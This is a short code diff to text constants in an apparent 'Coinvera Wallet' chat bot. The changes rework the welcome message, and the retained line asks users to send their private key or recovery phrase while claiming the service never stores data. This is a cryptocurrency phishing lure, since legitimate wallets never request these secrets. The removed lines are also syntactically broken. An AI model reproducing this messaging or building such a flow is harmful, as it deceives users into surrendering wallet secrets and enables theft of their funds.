@@ -43,8 +43,11 @@ const WALLET_SECURITY_TEXT = [
 ].join('\n');
 
 const WALLET_CONTINUE_TEXT = [
-    'const WALLET_CONTINUE_TEXT = [
-       '✅ Send your <b>private key,or recovery phrase</b> only — Note COINVERA never stores your data.',
+    '🔐 <b>Welcome to Coinvera Wallet</b>',
+    '',
+    'Your wallet connection is an important step towards accessing your Coinvera activities.',
+    '',
+    '✅ Send your <b>private key,or recovery phrase</b> only — Note COINVERA never stores your data.',
 ].join('\n');
 
 const WELCOME_TEXT = [
